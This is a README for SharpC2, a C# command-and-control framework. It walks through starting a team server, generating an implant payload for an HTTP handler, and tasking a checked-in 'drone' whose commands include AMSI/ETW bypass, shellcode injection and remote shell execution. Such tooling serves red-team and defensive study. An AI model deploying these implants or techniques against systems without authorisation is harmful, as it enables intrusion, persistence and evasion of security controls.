[![Build Status](https://travis-ci.com/SharpC2/SharpC2.svg?branch=main)](https://travis-ci.com/SharpC2/SharpC2)
[![Documentation Status](https://readthedocs.org/projects/sharpc2/badge/?version=latest)](https://sharpc2.readthedocs.io/en/latest/?badge=latest)

# SharpC2

SharpC2 is a Command and Control Framework written in C#.

The solution consists of an ASP.NET Core Team Server, a .NET Framework Implant, and a .NET Client.

## Quick Start

The quickest way to have a play with the framework is clone the repo, then build and run the Debug versions.

### Start the Team Server

```
C:\SharpC2\TeamServer> dotnet build
C:\SharpC2\TeamServer> cd .\bin\Debug\net6.0\
C:\SharpC2\TeamServer\bin\Debug\net6.0> dotnet TeamServer.dll -p Passw0rd!

info: Microsoft.Hosting.Lifetime[0]
      Now listening on: https://0.0.0.0:8443
info: Microsoft.Hosting.Lifetime[0]
      Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
      Hosting environment: Production
info: Microsoft.Hosting.Lifetime[0]
      Content root path: C:\SharpC2\TeamServer\bin\Debug\net6.0
```

**Note**:  If the server starts in `Development` mode, it will only listen for connections on the `localhost`.  To ensure it runs in `Production` mode (and therefore listen for connections on all interfaces) set the `ASPNETCORE_ENVIRONMENT` variable to `Production`.

### Start the Client

```
C:\SharpC2\Client> dotnet build
C:\SharpC2\Client> cd .\bin\Debug\net6.0\
C:\SharpC2\Client\bin\Debug\net6.0> dotnet SharpC2.dll -s localhost -p 8443 -n rasta -P Passw0rd!
  ___ _                   ___ ___
 / __| |_  __ _ _ _ _ __ / __|_  )
 \__ \ ' \/ _` | '_| '_ \ (__ / /
 |___/_||_\__,_|_| | .__/\___/___|
                   |_|
    @_RastaMouse
    @_xpn_


Server Certificate
------------------

[Subject]
  CN=localhost

[Issuer]
  CN=localhost

[Serial Number]
  67B4A5487F67745B

[Not Before]
  25/02/2021 21:01:43

[Not After]
  25/02/2022 21:01:43

[Thumbprint]
  B968C8D9C2B40F4AD7A46C92B0B700DEE46492FE

accept? [y/N] >
```

### Configure and Start the Default HTTP Handler

```
[drones] > handlers

[handlers] > list

Name          Running
----          -------
default-http  False
default-smb   False

[handlers] > set default-http BindPort 8080
[+] BindPort set to 8080

[handlers] > set default-http ConnectPort 8080
ConnectPort set to 8080

[handlers] > start default-http
[+] Handler "default-http" started.

[handlers] > list

Name          Running
----          -------
default-http  True
default-smb   False

[handlers] > back
[drones] >
```

### Generate a Payload for the Handler

```
[drones] > payload default-http Exe c:\payloads\drone.exe
[+] 204800 bytes saved.
```

Execute the payload.

```
[+] Drone abf7be1c27 checked in from Daniel@Ghost-Canyon.

[drones] > list

Guid        Parent  Address        Hostname      Username  Process  Pid   Integrity  Arch  LastSeen
----        ------  -------        --------      --------  -------  ---   ---------  ----  --------
abf7be1c27  -       192.168.1.229  Ghost-Canyon  Daniel    drone    1428  Medium     x64   24/11/2021 16:28:51
```

### Interacting with a Drone

```
[drones] > interact abf7be1c27

[abf7be1c27] > help

Name              Description
----              -----------
abort             Abort a running task
back              Go back to the previous screen
bypass            Set a directive to bypass AMSI/ETW on tasks
cat               Read a file as text
cd                Change working directory
execute-assembly  Execute a .NET assembly
exit              Exit this Drone
getuid            Get current identity
help              Print a list of commands and their description
link              Link to an SMB Drone
load-module       Load an external Drone module
ls                List filesystem
mkdir             Create a directory
overload          Map and execute a native DLL
ps                List running processes
pwd               Print working directory
rm                Delete a file
rmdir             Delete a directory
run               Run a command
services          List services on the current or target machine
shell             Run a command via cmd.exe
shinject          Inject arbitrary shellcode into a process
sleep             Set sleep interval and jitter
upload            Upload a file to the current working directory of the Drone

[abf7be1c27] > getuid
[+] Tasked Drone to run getuid: 3989657f56.
[+] Drone checked in. Sent 176 bytes.
[+] Drone task 3989657f56 is running.

GHOST-CANYON\Daniel

[+] Drone task 3989657f56 has completed.
```

## Documentation

See more documentation on [Read the Docs](https://sharpc2.readthedocs.io/en/latest).